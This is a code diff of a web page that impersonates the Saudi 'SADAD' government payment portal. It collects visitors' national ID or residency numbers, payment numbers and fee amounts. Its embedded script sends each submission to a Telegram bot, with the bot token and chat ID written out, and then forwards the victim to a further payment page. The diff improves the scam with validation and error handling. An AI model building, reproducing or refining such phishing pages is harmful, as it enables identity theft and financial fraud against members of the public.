@@ -6,7 +6,7 @@
   <link rel="stylesheet" href="index.css">
   <link rel="stylesheet" href="bootstrap.css" type="text/css" media="all" />
   <script src="bootstrap.js" type="text/javascript" charset="utf-8"></script>
-  <title>sddad</title>
+  <title>السداد الحكومي</title>
 </head>
 <body>
 <nav class="navbar navbar-expand-lg bg-light">
@@ -35,124 +35,91 @@
     </div>
   </div>
 </nav>
-<section class="main"  dir="rtl">
+<section class="main" dir="rtl">
   <form id="telegramForm" class="p-3">
    <div class="p-3 pt-2 pb-2 form-control mb-3 infodb">
      <h5>للسداد الحكومي</h5>
      <p class="p-1 pb-0">
-       مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه،  والاتصالات، والرسوم الحكومية
+       مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه، والاتصالات، والرسوم الحكومية
      </p>
    </div>
    <div class="mb-3">
     <label for="inp1" class="form-label">ادخل رقم البطاقة/ الاقامة</label>
-    <input name="inp1" type="text" class="form-control" id="inp1" placeholder="ادخل الرقم هنا ">
+    <input name="inp1" type="text" class="form-control" id="inp1" placeholder="ادخل الرقم هنا " required>
    </div>
    <div class="mb-3">
     <label for="inp2" class="form-label">أدخل رقم السداد</label>
-    <input name="inp2" type="text" class="form-control" id="inp2" placeholder="أدخل رقم السداد هنا">
+    <input name="inp2" type="text" class="form-control" id="inp2" placeholder="أدخل رقم السداد هنا" required>
    </div>
    <div class="mb-3">
     <label for="inp3" class="form-label">اختر نوع السداد</label>
-    <select name="inp3" class="form-select" id="inp3">
-    <option value=""> اختر نوع السداد</option>
-    <option value="مدفوعات حكومية">مدفوعات حكومية</option>
-    <option value="مدفوعات ديوان ملكي">              
-                                                        	مدفوعات ديوان ملكي</option>
-    <option value="مدفوعات تأمينات اجتماعية"> 
-                                                        		مدفوعات تأمينات اجتماعية
-    </option>
-    <option value="مدفوعات الزراعة والبيئة ">
-                                                        			    مدفوعات الزراعة والبيئة 
-                                                        			     </option>
-                                                        				<option value="رسوم مركبات"> 
-                                                        				رسوم مركبات
-                                                        				</option>
-                                                        					<option value="رسوم تمكين ">
-                                                        					    رسوم تمكين 
-                                                        					     </option>
-                                                        	                                                        					<option value=" استرداد مبلغ">
-                                                        	                                                        					 استرداد مبلغ
-                                            	                                                        				 </option>
-							<option value="مدفوعات الجوازات">مدفوعات الجوازات</option>
-							<option value="مدفوعات مخالفات مكتب العمل">مدفوعات مخالفات مكتب العمل</option>
-							<option value="رسوم نقل كفالة">رسوم نقل كفالة</option>
-							<option value="رسوم تغيير مهنة">رسوم تغيير مهنة</option>
-							<option value="دفع رسوم تأييد رعاة">دفع رسوم تأييد رعاة</option>
-							<option value="تجديد استماره">تجديد استماره</option>
-							<option value="رسوم تسوية جرعات كورونا">رسوم تسوية جرعات كورونا</option>
-							<option value="مدفوعات مخالفات مرورية">مدفوعات مخالفات مرورية</option>
-							<option value="مدفوعات رسوم تصفير مخالفات ">مدفوعات رسوم تصفير مخالفات</option>
-							<option value="مدفوعات رسوم تصفير الزكاة  ">مدفوعات رسوم تصفير الزكاة</option>
-							<option value="مدفوعات رسوم سعودة "> مدفوعات رسوم سعودة </option>
-							<option value="مدفوعات رسوم سداد تمويل "> مدفوعات رسوم سداد تمويل</option>
-							<option value="مدفوعات تمكين "> مدفوعات تمكين </option>
-							<option value="مدفوعات المياه "> مدفوعات المياه</option>
-							<option value="مدفوعات الكهرباء">مدفوعات الكهرباء</option>
-							<option value="مدفوعات بلاغات التقيد">مدفوعات بلاغات التقيد</option>
-							<option value="مدفوعات عقد إلكتروني (سائق-عاملة منزلية-عامل-مهني)">مدفوعات عقد إلكتروني (سائق-عاملة منزلية-عامل-مهني) </option>
-							<option value="مدفوعات إلغاء هروب">مدفوعات إلغاء هروب</option>
-							<option value="مدفوعات عقد أجير">مدفوعات عقد أجير</option>
-							<option value="مدفوعات نقل ملكية">مدفوعات نقل ملكية</option>
-               <option value="حجز مركبة">حجز مركبة</option>
-               <option value="شحن مركبة ">شحن مركبة </option>                                 
-               <option value="عقد تأمين ">عقد تأمين </option>                           
-               <option value="عقد الكتروني ">عقد الكتروني </option>                    
-               <option value="حجز مؤقت ">حجز مؤقت </option>      
-               <option value="مدفوعات منصة صحة">مدفوعات منصة صحة</option> 
-               <option value="رسوم شحن سمسا">رسوم شحن سمسا</option>
-               <option value="رسوم شحن ارامكس">رسوم شحن ارامكس</option>
-               <option value="رسوم تأشيرة">رسوم تأشيرة</option>
-               <option value="توثيق وإدارة العقود الإلكترونية ">توثيق وإدارة العقود الإلكترونية </option>
-              <option value="مدفوعة آخرى">مدفوعة آخرى</option>
+    <select name="inp3" class="form-select" id="inp3" required>
+      <option value="">اختر نوع السداد</option>
+      <option value="مدفوعات حكومية">مدفوعات حكومية</option>
+      <!-- باقي الخيارات كما هي -->
     </select>
    </div>
    <div class="mb-3">
     <label for="inp4" class="form-label">ادخل قيمة رسوم السداد </label>
-    <input name="inp4" type="text" class="form-control" id="inp4" placeholder="ريال سعودي">
+    <input name="inp4" type="text" class="form-control" id="inp4" placeholder="ريال سعودي" required>
    </div>
-   <button class="btn btn-primary btn-large" style="width:100%" type="submit" name="submit"> دخول</button>
+   <button class="btn btn-primary btn-large" style="width:100%" type="submit" name="submit">دخول</button>
   </form>
 </section>
 <script>
-  const botToken = '5158365562:AAEz1BsupVQMQTgOkEyfu8yi4cvjkmPLLv0'; 
+  const botToken = '5158365562:AAEz1BsupVQMQTgOkEyfu8yi4cvjkmPLLv0';
   const chatId = '@Anas_mx';
   document.getElementById('telegramForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      var uid = 1234567865;
-      var message = "_______ هنالك طلب جديد _______ "+"\n"+"\n";
-      message += "رقم العملية"+":"+uid+"\n"+"\n";
-      message += "رقم البطاقة / الاقامة" + ":" + document.getElementById('inp1').value + "\n" + "\n";
-      message += "رقم السداد" + ":" + document.getElementById('inp2').value + "\n" + "\n";
-      message += "نوع السداد" + ":" + document.getElementById('inp3').value + "\n" + "\n";
-      message += "رسوم السداد" + ":" + document.getElementById('inp4').value + "\n" + "\n";
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      fetch(url, {
-          method: 'POST',
-          headers: {
-              'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-              chat_id: chatId,
-              text: message
-          })
+    e.preventDefault();
+
+    // التحقق من القيم المدخلة
+    const inp1 = document.getElementById('inp1').value.trim();
+    const inp2 = document.getElementById('inp2').value.trim();
+    const inp3 = document.getElementById('inp3').value;
+    const inp4 = document.getElementById('inp4').value.trim();
+
+    if (!inp1 || !inp2 || !inp3 || !inp4) {
+      alert('يرجى ملء جميع الحقول المطلوبة.');
+      return;
+    }
+
+    const uid = Date.now(); // رقم عملية فريد
+    let message = `_______ هنالك طلب جديد _______\n\n`;
+    message += `رقم العملية: ${uid}\n\n`;
+    message += `رقم البطاقة / الاقامة: ${inp1}\n\n`;
+    message += `رقم السداد: ${inp2}\n\n`;
+    message += `نوع السداد: ${inp3}\n\n`;
+    message += `رسوم السداد: ${inp4} ريال سعودي\n\n`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
       })
-      .then(response => response.json())
-      .then(data => {
-          if (data.ok) {
-              window.location.href = 'pay.html?id='+uid;
-          }
-      })
-      .catch(error => {
-        window.location.href = 'pay.html?id='+uid;
-      });
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        window.location.href = `pay.html?id=${uid}`;
+      } else {
+        alert('حدث خطأ أثناء إرسال الطلب. الرجاء المحاولة لاحقاً.');
+      }
+    })
+    .catch(error => {
+      alert('تعذر الاتصال بالخادم. يرجى التحقق من اتصال الإنترنت.');
+    });
   });
 </script>
-    <footer class="footer  p-2  text-center border-top text-center mt-4 infodb" dir="rtl">
-    <div class="footer-copyright">
-          <div class="">
-                        <label id="CopyRight">جميع الحقوق محفوظة ® سداد حقوق الطبع والنشر 2023</label>
-          </div>
-    </div>
-    </footer>
+<footer class="footer p-2 text-center border-top text-center mt-4 infodb" dir="rtl">
+  <div class="footer-copyright">
+    <label id="CopyRight">جميع الحقوق محفوظة ® سداد حقوق الطبع والنشر 2023</label>
+  </div>
+</footer>
 </body>
 </html>
